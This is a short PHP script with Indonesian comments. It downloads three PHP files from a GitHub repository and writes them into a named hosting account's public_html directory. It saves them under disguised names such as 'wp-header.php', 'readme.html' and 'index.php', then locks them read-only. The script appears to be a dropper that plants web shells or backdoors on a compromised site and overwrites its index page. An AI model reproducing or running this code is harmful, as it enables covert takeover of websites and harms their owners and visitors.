<?php
// Daftar file dari GitHub (RAW URL) dan nama penyimpanan lokal
$files = [
    [
        'url' => 'https://raw.githubusercontent.com/kingmutiara69/zz/refs/heads/main/z2.php',
        'save_as' => 'wp-header.php'
    ],
    [
        'url' => 'https://raw.githubusercontent.com/kingmutiara69/zz/refs/heads/main/z1.php',
        'save_as' => 'readme.html'
    ],
    [
        'url' => 'https://raw.githubusercontent.com/kingmutiara69/zz/refs/heads/main/a3.php',
        'save_as' => 'index.php'
    ]
];

// Folder tujuan
$targetDirectory = '/home/frankcoop/public_html/';

// Cek dan buat folder jika belum ada
if (!is_dir($targetDirectory)) {
    if (!mkdir($targetDirectory, 0755, true)) {
        die("❌ Gagal membuat folder target: $targetDirectory\n");
    }
}

// Fungsi download dengan cURL
function downloadFile($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 15
    ]);
    $data = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($httpCode === 200) ? $data : false;
}

// Proses unduh dan simpan file
foreach ($files as $file) {
    $url = $file['url'];
    $filename = $file['save_as'];
    $path = rtrim($targetDirectory, '/') . '/' . $filename;

    if (file_exists($path)) {
        echo "✔️ File $filename sudah ada.\n";
        continue;
    }

    echo "⏬ Mengunduh $filename...\n";
    $content = downloadFile($url);

    if ($content === false) {
        echo "❌ Gagal mengunduh $filename dari $url\n";
        continue;
    }

    if (file_put_contents($path, $content) === false) {
        echo "❌ Gagal menyimpan $filename\n";
        continue;
    }

    // Ubah permission menjadi read-only untuk semua (0444)
    if (!chmod($path, 0444)) {
        echo "❌ Gagal mengubah permission $filename ke 0444\n";
        continue;
    }

    echo "✅ $filename berhasil diunduh dan di-set ke permission 0444\n";
}
?>
